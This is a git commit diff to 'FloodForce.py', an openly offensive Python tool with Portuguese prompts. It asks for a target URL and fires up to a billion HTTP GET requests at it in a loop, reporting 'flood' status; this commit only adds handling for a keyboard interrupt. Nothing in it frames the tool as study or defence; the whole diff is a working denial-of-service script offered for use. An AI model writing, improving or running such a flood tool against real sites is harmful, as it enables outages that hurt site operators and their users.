05f3cd673b2d9e526ab96d97b381cc14c0f0bbbf
DarkZero <ruanvsd2024@gmail.com>
2025-08-31 01:33:15 -0300

    Update FloodForce.py

--- FloodForce.py
+++ FloodForce.py
@@ -3,6 +3,7 @@ import os
 import pyfiglet
 from colorama import init, Fore, Style
 import sys
+import time
 
 class httpFlood:
 	def atack(self):
@@ -14,14 +15,21 @@ class httpFlood:
 				print(Fore.RED+f"{lg}"+Style.RESET_ALL)
 			banner()
 			
-			ip = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
-			
-			for i in range(1, 1000000000):
-				rqs = requests.get(ip)
-				print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
+			try:
+				ip = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
+				
+				for i in range(1, 1000000000):
+					rqs = requests.get(ip)
+					print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
+					
+			except KeyboardInterrupt:
+				print(Fore.RED+"saindo..."+Style.RESET_ALL)
+				time.sleep(2)
+				exit()
 				
 		except requests.exceptions.RequestException as e:
 			print(Fore.RED+f"tipo do erro de requests: {e}"+Style.RESET_ALL)
 			
 HFD = httpFlood()
 HFD.atack()
+				
